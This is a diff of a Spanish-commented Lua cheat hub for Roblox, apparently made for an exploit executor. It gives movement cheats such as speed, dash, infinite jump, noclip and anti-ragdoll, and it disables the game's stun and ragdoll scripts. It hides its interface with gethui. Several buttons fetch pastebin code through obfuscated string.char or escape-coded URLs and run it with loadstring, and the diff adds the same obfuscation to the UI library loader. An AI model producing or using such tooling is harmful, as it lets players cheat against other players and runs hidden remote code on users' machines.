@@ -1,7 +1,28 @@
 local _v1,_v2,_v3,_v4,_v5,_v6,_v7=game:GetService("Players"),game:GetService("UserInputService"),game:GetService("RunService"),game:GetService("CoreGui"),game:GetService("ReplicatedStorage"),game:GetService("TeleportService"),game:GetService("HttpService")
-local _v8,_v9=_v1.LocalPlayer,loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
-local _s1={AR=false,IJ=false,WS={E=false,V=16},TP={E=false,V=1},NC=false,UI={K="RightShift"},ER={E=false,HT=6,TD=366,WT=0.3,HC=0,LHT=0,IT=false,RT=3,Db=0.08},MB={D=false}}
+local _v8,_v9=_v1.LocalPlayer,loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,70,111,111,116,97,103,101,115,117,115,47,87,105,110,100,85,73,47,109,97,105,110,47,100,105,115,116,47,109,97,105,110,46,108,117,97)))()
+
+-- =====================================================================
+-- MOTOR DE SEGURIDAD Y ENRUTAMIENTO DE INTERFAZ
+-- =====================================================================
+local function GetSecureContainer()
+    if gethui then
+        return gethui()
+    elseif get_hidden_gui then
+        return get_hidden_gui()
+    end
+    local success, coreGui = pcall(function()
+        return game:GetService("CoreGui")
+    end)
+    if success and coreGui then
+        return coreGui
+    end
+    return _v8:WaitForChild("PlayerGui")
+end
+
+local _s1={AR=false,IJ=false,WS={E=false,V=16},TP={E=false,V=1},NC=false,UI={K="RightShift"},ER={E=false,HT=6,TD=66,WT=0.3,HC=0,LHT=0,IT=false,RT=3,Db=0.08},MB={D=false}}
 local _b1,_c1,_c2,_c3,_c4,_c5,_c6,_c7,_c8=true,nil,nil,nil,nil,nil,nil,nil,nil
+
+-- ==========================================
 -- SISTEMA DE MEMORIA PARA SCRIPTS
 -- ==========================================
 local _disabledScripts = {}
@@ -15,7 +36,7 @@ local function disableBadScripts(char)
             if name:find("stun") or name:find("fall") or name:find("ragdoll") then
                 if not obj.Disabled then
                     obj.Disabled = true
-                    table.insert(_disabledScripts, obj) -- Recordamos qué apagamos
+                    table.insert(_disabledScripts, obj) 
                 end
             end
         end
@@ -25,11 +46,13 @@ end
 local function enableBadScripts()
     for _, obj in ipairs(_disabledScripts) do
         if obj and obj.Parent then
-            pcall(function() obj.Disabled = false end) -- Lo volvemos a encender
+            pcall(function() obj.Disabled = false end) 
         end
     end
-    table.clear(_disabledScripts) -- Limpiamos la memoria
+    table.clear(_disabledScripts) 
 end
+
+-- ==========================================
 -- LÓGICA ANTI-RAGDOLL OPTIMIZADA
 -- ==========================================
 local function _f1(st) 
@@ -40,18 +63,17 @@ local function _f1(st)
     if st then 
         if _c3 then _c3:Disconnect(); _c3 = nil end
 
-_c3 = _v3.Heartbeat:Connect(function() 
+        _c3 = _v3.Heartbeat:Connect(function() 
             if not _s1.AR then return end; 
             if ev then pcall(function() ev:FireServer(false) end) end; 
             
-        local badStates = {
-            [Enum.HumanoidStateType.Physics] = true,
-            [Enum.HumanoidStateType.FallingDown] = true,
-            [Enum.HumanoidStateType.GettingUp] = true,
-            [Enum.HumanoidStateType.Ragdoll] = true
-        }
+            local badStates = {
+                [Enum.HumanoidStateType.Physics] = true,
+                [Enum.HumanoidStateType.FallingDown] = true,
+                [Enum.HumanoidStateType.GettingUp] = true,
+                [Enum.HumanoidStateType.Ragdoll] = true
+            }
 
-        
             if _v8.Character then 
                 local h = _v8.Character:FindFirstChildOfClass("Humanoid"); 
                 if h then 
@@ -66,28 +88,19 @@ _c3 = _v3.Heartbeat:Connect(function()
             end 
         end); 
         
-        -- Desactivamos los scripts solo una vez para evitar lag
         disableBadScripts(_v8.Character)
         
-        -- Si el jugador muere o reinicia mientras el botón está encendido, lo volvemos a proteger
         if _charAddedConn then _charAddedConn:Disconnect() end
         _charAddedConn = _v8.CharacterAdded:Connect(function(char)
             if _s1.AR then
-                task.wait(1.5) -- Damos tiempo al juego para cargar al personaje
+                task.wait(1.5) 
                 disableBadScripts(char)
             end
         end)
         
     else 
-        -- APAGADO LIMPIO
-        if _c3 then 
-            _c3:Disconnect(); 
-            _c3 = nil; 
-        end; 
-        if _charAddedConn then
-            _charAddedConn:Disconnect();
-            _charAddedConn = nil;
-        end
+        if _c3 then _c3:Disconnect(); _c3 = nil; end; 
+        if _charAddedConn then _charAddedConn:Disconnect(); _charAddedConn = nil; end
         
         if _v8.Character then 
             local h = _v8.Character:FindFirstChildOfClass("Humanoid"); 
@@ -97,10 +110,11 @@ _c3 = _v3.Heartbeat:Connect(function()
             end 
         end 
         
-        -- ¡CRUCIAL! Restaurar los scripts originales del juego para evitar bugs
         enableBadScripts()
     end 
 end
+
+-- ==========================================
 -- RESTO DE FUNCIONES DEL HUB
 -- ==========================================
 _c1=_v2.JumpRequest:Connect(function() if _s1.IJ and _v8.Character and _v8.Character:FindFirstChildOfClass("Humanoid") then _v8.Character.Humanoid:ChangeState(3) end end)
@@ -121,9 +135,73 @@ local _btn1
 _btn1=_f4("DASH\nOFF",UDim2.fromScale(0.72,0.04),Color3.fromRGB(100,100,100),function() _s1.TP.E=not _s1.TP.E; _btn1.Text=_s1.TP.E and "DASH\nON" or "DASH\nOFF"; _btn1.BackgroundColor3=_s1.TP.E and Color3.fromRGB(37,122,247) or Color3.fromRGB(100,100,100) end)
 _f6(_btn1)
 
-local _w1=_v9:CreateWindow({Title="☢️ Family HS HUB",Author="by jake_Hs",Folder="HsHub",Accent=Color3.fromRGB(255,255,0),Transparent=true,Theme="Amber",BackgroundImageTransparency=9,Size=UDim2.fromOffset(580,460),Resizable=true,HideSearchBar=true,ScrollBarEnabled=false,OpenButton={Title="☢️ HS ULTRA GUNS",CornerRadius=UDim.new(1,0),StrokeThickness=2,Enabled=true,Draggable=true,Scale=0.8,Color=ColorSequence.new(Color3.fromHex("#ffff00"),Color3.fromHex("#ffff00"))}})
+-- =====================================================================
+-- CREACIÓN DE VENTANA (WINDUI)
+-- =====================================================================
+local _w1=_v9:CreateWindow({
+    Title="☢️ Family HS HUB",
+    Author="by jake_Hs",
+    Folder="HsHub",
+    Accent=Color3.fromRGB(255,255,0),
+    Transparent=true,
+    Theme="Amber",
+    BackgroundImageTransparency=9,
+    Size=UDim2.fromOffset(580,460),
+    Resizable=true,
+    HideSearchBar=true,
+    ScrollBarEnabled=false,
+    OpenButton={
+        Title="☢️ HS ULTRA GUNS",
+        CornerRadius=UDim.new(1,0),
+        StrokeThickness=2,
+        Enabled=true,
+        Draggable=true,
+        Scale=0.8,
+        Color=ColorSequence.new(Color3.fromHex("#ffff00"),Color3.fromHex("#ffff00"))
+    }
+})
 _w1:SetToggleKey(Enum.KeyCode[_s1.UI.K])
 
+-- =====================================================================
+-- ANIMACIÓN BICOLOR (AMARILLO/NEGRO PARA EL CONTORNO DEL BOTÓN)
+-- =====================================================================
+task.spawn(function()
+    task.wait(2) 
+    local uiContainer = GetSecureContainer()
+    local targetStroke = nil
+
+    for _, obj in ipairs(uiContainer:GetDescendants()) do
+        if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and string.find(string.lower(obj.Text), "hs ultra guns") then
+            local currentLayer = obj
+            for i = 1, 4 do
+                if currentLayer then
+                    if not targetStroke then 
+                        targetStroke = currentLayer:FindFirstChildOfClass("UIStroke") 
+                    end
+                    currentLayer = currentLayer.Parent
+                end
+            end
+            if targetStroke then break end
+        end
+    end
+
+    if targetStroke then
+        local colorYellow = Color3.fromRGB(255, 255, 0)
+        local colorBlack = Color3.fromRGB(0, 0, 0)
+        
+        game:GetService("RunService").RenderStepped:Connect(function()
+            -- Oscila suavemente entre 0 y 1 usando seno
+            local alpha = (math.sin(tick() * 3) + 1) / 2
+            targetStroke.Color = colorYellow:Lerp(colorBlack, alpha)
+        end)
+    else
+        warn("[HsHub] Error: No se pudo encontrar el contorno del OpenButton en el contenedor seguro.")
+    end
+end)
+
+-- =====================================================================
+-- PESTAÑAS Y FUNCIONES
+-- =====================================================================
 local _tb1=_w1:Tab({Title="Movilidad",Icon="solar:running-bold"})
 
 local _initWS = false
@@ -196,12 +274,15 @@ _tb3:Button({Title="💥gema de la realidad",Desc="altera la realidad te cambia 
 _tb3:Button({Title="🛩️HS Flayers",Desc="pa ke vuelen alto mis panas esto funciona en otros juegos también",Color=Color3.fromRGB(37,122,247),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\85\65\88\103\65\112\89\89"))() end})
 _tb3:Button({Title="👻invisibles y otras variantes 👻💥",Desc="es una mini biblioteca que contiene variantes de invisible",Color=Color3.fromRGB(255,255,0),Callback=function() local _g,_l=game,loadstring;local _u=string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,104,109,101,97,84,68,53,67);_l(_g:HttpGet(_u))() end})
 
--- DETECTOR DE DESTRUCCIÓN (LIMPIEZA TOTAL AL USAR LA 'X')
+-- =====================================================================
+-- DETECTOR DE DESTRUCCIÓN SEGURO (LIMPIEZA TOTAL AL USAR LA 'X')
 -- =====================================================================
 task.spawn(function()
     task.wait(2) 
-    local uiContainer = (gethui and gethui()) or game:GetService("CoreGui")
+    
+    local uiContainer = GetSecureContainer()
     local mainGui = nil
+    
     for _, obj in ipairs(uiContainer:GetDescendants()) do
         if obj:IsA("TextLabel") and obj.Text == "☢️ Family HS HUB" then
             mainGui = obj:FindFirstAncestorWhichIsA("ScreenGui")
@@ -221,6 +302,8 @@ task.spawn(function()
                 if _w1 and _w1.Destroy then _w1:Destroy() end
             end
         end)
+    else
+        warn("[HsHub] Búsqueda Segura Activa: No se pudo anclar la limpieza automática.")
     end
 end)
 
